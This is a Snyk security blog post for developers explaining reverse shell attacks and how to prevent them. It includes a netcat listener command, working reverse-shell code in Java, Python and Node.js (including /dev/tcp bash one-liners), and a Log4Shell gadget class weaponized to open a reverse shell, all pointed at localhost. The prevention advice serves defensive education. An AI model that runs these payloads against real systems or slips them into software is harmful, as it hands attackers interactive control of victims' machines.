---
title: "Controlling your Server with a Reverse Shell Attack"
slug: "controlling-your-server-with-a-reverse-shell-attack"
date: "2022-09-08T13:00:22+00:00"
lastmod: "2022-09-08T13:07:15+00:00"
description: "The last thing you need for your happily deployed application is someone to take over your system and fully control it!"
canonical: "https://snyk.io/blog/reverse-shell-attack/"
authors:
  - "bmvermeer"
image: "snykattack.png"
categories:
  - "Security"
tags:
related_posts:
  - "are-java-security-updates-important"
  - "java-where-the-wild-code-isnt"
  - "security-warning-your-java-attack-surface-just-got-bigger"
enlighterjs: true
frozen: false
---

Creating and running an application in your favorite language is usually pretty simple. After you create your application, deploying it and showing it to the world is also quite straightforward.

The last thing you need is someone to take over your system and fully control your brand new application.

In this article, I'll explain how this can happen with a remote shell attack.

Note: The code examples in this article are for educational purposes only. I mainly try to explain what a remote shell attack is and how it can occur in your applications. Using this or any other example to hack someone is not advised. In most countries, hacking without the consent of the target is illegal, even if you have the best intentions.

What is a reverse shell? {#h2-0-what-is-a-reverse-shell}
--------------------------------------------------------

A reverse shell (or connect-back shell) is a shell session initiated by the target machine to a remote host. The target machine opens the session to a specific host and port. A shell connection can be created if the remote host listens on that port with the appropriate software. It's important to note that the initiation is done by the target machine,not the remote host.

With a remote shell attack, an attacker tries to make the victim machine initiate such a connection. The attack can establish interactive shell access (basically a terminal) and take over the victim machine.

How does a reverse shell attack happen? {#h2-1-how-does-a-reverse-shell-attack-happen}
--------------------------------------------------------------------------------------

In most cases, a reverse shell attack happens when an application is vulnerable to a remote code execution vulnerability. An attacker uses such a [vulnerability](https://snyk.io/learn/security-vulnerability-exploits-threats/) in an application to execute some code on the victim's machine that initiates the shell session.

Without knowing it, the victim creates a connection and the attacker only has to listen for incoming connections on the correct port. Once the connection is established, the attacker has shell access to the victim and does all sorts of exciting things.

Think of it like a tennis ball. If you throw it at something hard, it will come back at you. You only need to catch it at the right place and time.

Making a reverse shell connection {#h2-2-making-a-reverse-shell-connection}
---------------------------------------------------------------------------

To create a reverse shell, you have multiple options depending on your language. However, before executing this reverse shell code, we need to make sure that we listen to the correct port for incoming connections.

### Listening for incoming connections using netcat {#h3-3-listening-for-incoming-connections-using-netcat}

A great tool to do this is netcat. Netcat (often abbreviated to nc) is a computer networking utility for reading from and writing to network connections using [TCP](https://en.wikipedia.org/wiki/Transmission_Control_Protocol) or [UDP](https://en.wikipedia.org/wiki/User_Datagram_Protocol). On the machine you want the reverse shell to connect to, you can use netcat to listen to incoming connections on a specific port. The example below shows how to make netcat listen to port 9001. Note that the v parameter is not strictly needed, but it gives me a nice verbose output.

`nc -lvp 9001`

Execute a reverse shell in Python, Java or Node.js {#h2-4-execute-a-reverse-shell-in-python-java-or-node-js}
------------------------------------------------------------------------------------------------------------

Let's discuss two approaches to setting up a reverse shell. Both examples are suitable for systems that have the bash shell installed.

### Method 1: Programmatically {#h3-5-method-1-programmatically}

The first method is programmatic action where we start up a shell. Next, we create a socket connection to the remote computer with the appropriate IP address and port.

Lastly, we connect the file descriptors (input, output and error) from the shell to the newly created socket connection.

Java:

<pre class="EnlighterJSRAW" data-enlighter-language="java" data-enlighter-theme="dracula">public static void main(String[] args) throws IOException {
       Process process = new ProcessBuilder("bash").redirectErrorStream(true).start();
       Socket socket = new Socket("127.0.0.1", 9001);
       InputStream pInput = process.getInputStream();
       InputStream pError = process.getErrorStream();
       InputStream sInput = socket.getInputStream();

       OutputStream pOutput = process.getOutputStream();
       OutputStream sOutput = socket.getOutputStream();

       while (!socket.isClosed()) {
           while (pInput.available() &gt; 0) sOutput.write(pInput.read());
           while (pError.available() &gt; 0) sOutput.write(pError.read());
           while (sInput.available() &gt; 0) pOutput.write(sInput.read());
           sOutput.flush();
           pOutput.flush();
       }
}</pre>

In this Java example, we route the process's `InputStream` and `ErrorStream` to the `OutputStream` of the remote socket connection. We also need to do this the other way around and write the `Socket OutputStream` into the `Inputstream` of the bash process.

Python:

<pre class="EnlighterJSRAW" data-enlighter-language="java" data-enlighter-theme="dracula">import sys,socket,os,pty;

s = socket.socket();
s.connect(("127.0.0.1",9001));
[os.dup2(s.fileno(),fd) for fd in (0,1,2)];
pty.spawn("bash");</pre>

In this Python script, we connect the stdin, stdout and stderr to the socket connection. In Unix-like systems these are the first three file descriptors. Next we use pty to run `bash`.

Node.js:

<pre class="EnlighterJSRAW" data-enlighter-language="java" data-enlighter-theme="dracula">var net = require("net");
var cp = require("child_process");
var sh = cp.spawn("bash", []);
var client = new net.Socket();
client.connect(9001, "127.0.0.1", function(){
   client.pipe(sh.stdin);
   sh.stdout.pipe(client);
   sh.stderr.pipe(client);
});</pre>

This Node.js example is very similar to the Python example. We run `bash` and connect the standard file descriptors appropriately to the socket connection.

### Method 2: Execute a shell command {#h3-6-method-2-execute-a-shell-command}

The second method is a bit shorter. Most languages have a way to execute shell commands like:

* `Runtime.getRuntime()` in Java
* `os.system()` in Python
* `require('child_process').exec()` in Node.js

We can leverage these functions to call a one-liner shell command that initiates the reverse shell for us.

Java:

<pre class="EnlighterJSRAW" data-enlighter-language="java" data-enlighter-theme="dracula">public static void main(String[] args) throws IOException {
   String[] cmd = {
           "bash",
           "-c",
           "exec 5&lt;&gt;/dev/tcp/127.0.0.1/9001;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done" };

   Runtime.getRuntime().exec(cmd);
}</pre>

Python:

<pre class="EnlighterJSRAW" data-enlighter-language="java" data-enlighter-theme="dracula">import os;

os.system('bash -c "bash -i 5&lt;&gt; /dev/tcp/127.0.0.1/9001 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5"')</pre>

Node.js

<pre class="EnlighterJSRAW" data-enlighter-language="java" data-enlighter-theme="dracula">require('child_process').exec('bash -c "bash -i 5&lt;&gt; /dev/tcp/127.0.0.1/9001 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5"')
</pre>

When you first execute the netcat command listening to port 9001, before executing this piece of code, you will notice that the connection is established and you can execute shell commands like the one below.

![Terminal window containing the "whoami" shell command.](https://snyk.io/wp-content/uploads/blog-reverseshell-whoami_command.png)

You make a reverse shell connection to yourself with all of the above examples. If you want to do this to a remote machine, you obviously need to change the IP address appropriately. Next, remember that even if you have access, the privilege depends on the user running this code on the victim's machine. To get elevated privileges, you might need to do a bit more.

Creating a reverse shell attack using a remote code execution vulnerability {#h2-7-creating-a-reverse-shell-attack-using-a-remote-code-execution-vulnerability}
---------------------------------------------------------------------------------------------------------------------------------------------------------------

To create an actual attack with code examples like this, we need to leverage a code execution vulnerability and insert the code into an existing system.

A great example is the \[Log4Shell vulnerability\](<https://snyk.io/blog/log4j-rce>- log4shell-vulnerability-cve-2021-44228/) that was discovered in December 2021.

It was possible to insert a gadget class that executed code when it was instantiated. Many of the examples showed how to launch the calculator or something harmless. Nevertheless, the code below would create a gadget for this infamous Log4j vulnerability. By exploiting Log4Shell now, you do not start up the calculator anymore but weaponize it into a reversed shell enabler.

<pre class="EnlighterJSRAW" data-enlighter-language="java" data-enlighter-theme="dracula">public class Evil implements ObjectFactory {

   @Override
   public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) throws Exception {
       String[] cmd = {
               "/bin/bash",
               "-c",
               "exec 5&lt;&gt;/dev/tcp/127.0.0.1/9001;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done" };

       Runtime.getRuntime().exec(cmd);
       return null;
   }
}</pre>

Almost all remote code executions can be used to enable a reverse shell attack. Other recent examples were \[Spring4Shell\](<https://snyk.io/blog/spring4shell-zero-day-rce-spring>- framework-explained/) and the \[Apache Commons Configuration RCE\](<https://snyk.io/blog/cve-2022-33980-apache-commons-configuration-rce>- vulnerability/).

Both examples were not as problematic as Log4Shell, but you can use either to create a reverse shell attack and possibly control a target machine. Therefore, it's essential to prevent that user input from (partially) being executed.

How to prevent reverse shell attacks {#h2-8-how-to-prevent-reverse-shell-attacks}
---------------------------------------------------------------------------------

If we can prevent an attacker from executing code on your machine, we eliminate almost all possibilities of a reverse shell attack. Let's look at some measures you can take to prevent malicious reverse shell attacks as a developer.

* **Remove execution statements**. Statements in your code that can execute scripts or other pieces of code like exec() should be avoided as much as possible.
* **Sanitize and validate inpu** t. All input must be considered potentially malicious. This is not only direct user input. For instance, when a database field is the input of an execution, somebody can try to attack the database.
* **Run your application with limited privileges**. Don 't run your application as root but create a user with the least privileges needed. This, unfortunately, happens a lot with applications in Docker containers as the default user in a Docker container is root.
* **Prevent vulnerabilities that enable remote code execution**. If a library or framework is compromised, replace it with a secure version.

Almost all remote code executions can be used for a reverse shell attack, even if the use case looks far-fetched.

Snyk can help! {#h2-9-snyk-can-help}
------------------------------------

Snyk is a helpful tool for preventing reverse shell attacks by scanning code and dependencies.

It points out potential security mistakes in your custom code, and scans your dependencies for known vulnerabilities.

[Sign up for Snyk's free tier to start scanning.](https://app.snyk.io/login)
